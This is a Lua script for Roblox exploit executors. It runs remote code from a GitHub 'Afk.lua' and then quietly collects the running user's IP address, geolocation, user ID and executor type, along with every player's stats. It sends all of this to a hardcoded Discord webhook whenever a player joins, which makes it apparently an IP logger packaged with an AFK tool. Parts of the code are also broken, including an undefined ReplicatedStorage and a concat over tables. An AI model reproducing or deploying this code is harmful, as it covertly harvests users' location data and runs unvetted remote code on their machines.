loadstring(game:HttpGet("https://raw.githubusercontent.com/Fernanflop091o/Queuet/refs/heads/main/Afk.lua"))()

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

local discordWebhookUrl = "https://discord.com/api/webhooks/1286118077829742593/KbfczS76YlMW7x_Q9vbA60XRE78_xc9uvDZOGkzLU5AEfP-fH1iX-_P6YzBg7d6-WiJn"
local playerDataFile = "PlayerData.json"

-- Verifica si el archivo existe
local function fileExists(filename)
    return isfile(filename)
end

-- Carga los datos del jugador desde el archivo
local function loadPlayerData()
    if fileExists(playerDataFile) then
        local fileContents = readfile(playerDataFile)
        return HttpService:JSONDecode(fileContents) or {}
    end
    return {}
end

-- Guarda los datos del jugador en el archivo
local function savePlayerData(data)
    writefile(playerDataFile, HttpService:JSONEncode(data))
end

-- Verifica si ya se enviaron datos para el jugador
local function hasPlayerData(jobId)
    local playerData = loadPlayerData()
    return playerData[jobId] ~= nil
end

-- Guarda el ID del trabajo del jugador
local function savePlayerJobId(jobId)
    local playerData = loadPlayerData()
    playerData[jobId] = true
    savePlayerData(playerData)
end

-- Obtiene el JobId y HWID
local function getJobIdAndHwid()
    local jobId = game.JobId
    local hwid = game.Players.LocalPlayer.UserId
    return jobId, hwid
end

-- Formatea números grandes
local function formatNumber(number)
    if number < 1000 then
        return tostring(number)
    end
    local suffixes = {"", "K", "M", "B", "T", "QD"}
    local suffix_index = 1
    while math.abs(number) >= 1000 and suffix_index < #suffixes do
        number = number / 1000.0
        suffix_index = suffix_index + 1
    end
    return string.format("%.2f%s", number, suffixes[suffix_index])
end

-- Obtiene información de IP
local function getPlayerIPInfo()
    local ip, data = "N/A", "N/A"
    local success, response = pcall(function()
        ip = game:HttpGet("https://v4.ident.me/")
        data = game:HttpGet("http://ip-api.com/json")
    end)
    if not success then
        warn("Error al obtener IP o geolocalización:", response)
    end
    return ip, data
end

-- Detecta el tipo de ejecutor
local function detectExecutor()
    local executorType = "Unsupported"
    if syn and not is_sirhurt_closure and not pebc_execute then
        executorType = "Synapse X"
    elseif secure_load then
        executorType = "Sentinel"
    elseif pebc_execute then
        executorType = "ProtoSmasher"
    elseif KRNL_LOADED then
        executorType = "Krnl"
    elseif is_sirhurt_closure then
        executorType = "SirHurt"
    elseif identifyexecutor() and identifyexecutor():find("ScriptWare") then
        executorType = "Script-Ware"
    end
    return executorType
end

-- Obtiene información sobre todos los jugadores
local function getAllPlayerData()
    local playerDataList = {}
    for _, player in pairs(Players:GetPlayers()) do
        local playerData = {}
        local playerName = player.Name
        local playerDisplayName = player.DisplayName

        local folderData = ReplicatedStorage:FindFirstChild("Datas"):FindFirstChild(player.UserId)
        if folderData then
            local rebirthValue = folderData:FindFirstChild("Rebirth") and folderData.Rebirth.Value or 0
            local strengthValue = folderData:FindFirstChild("Strength") and folderData.Strength.Value or 0
            local formattedRebirth = formatNumber(rebirthValue)
            local formattedStrength = formatNumber(strengthValue)

            local combinedLabel = string.format("Jugador: %s\nApodo: %s\nRebirth: %s\nStrength: %s",
                playerName, playerDisplayName, formattedRebirth, formattedStrength)

            table.insert(playerDataList, {
                label = combinedLabel,
                rebirth = rebirthValue,
                strength = strengthValue
            })
        end
    end

    table.sort(playerDataList, function(a, b)
        if a.strength ~= b.strength then
            return a.strength > b.strength
        elseif a.rebirth ~= b.rebirth then
            return a.rebirth > b.rebirth
        end
        return false
    end)

    return playerDataList
end

-- Envía la información del jugador a Discord
local function sendPlayerInfoToDiscord()
    local jobId, hwid = getJobIdAndHwid()
    
    -- Verificar si ya se enviaron datos para este jugador
    if hasPlayerData(jobId) then
        print("Ya se han enviado datos para este jugador.")
        return
    end

    local ip, ipData = getPlayerIPInfo()
    local executor = detectExecutor()
    local allPlayerData = getAllPlayerData()

    local dataToSend = {
        ["embeds"] = {
            {
                ["description"] = "Jugadores del juego:\n\n" .. table.concat(allPlayerData, "\n\n"),
                ["color"] = 0x00ff00,
                ["title"] = "Estadísticas de los jugadores",
                ["fields"] = {
                    {
                        ["name"] = "JobId",
                        ["value"] = jobId,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "HWID",
                        ["value"] = hwid,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "IP",
                        ["value"] = ip,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Datos de IP",
                        ["value"] = ipData,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "Executor",
                        ["value"] = executor,
                        ["inline"] = true
                    }
                }
            }
        }
    }

    local success, response = pcall(function()
        return http_request({
            Url = discordWebhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(dataToSend)
        })
    end)

    if not success then
        warn("Error al enviar datos a Discord:", response)
    else
        print("Datos enviados a Discord exitosamente.")
        savePlayerJobId(jobId) -- Guardar el jobId después de enviar
    end
end

-- Ejecutar la función para enviar información a Discord
Players.PlayerAdded:Connect(function(player)
    sendPlayerInfoToDiscord()
end)
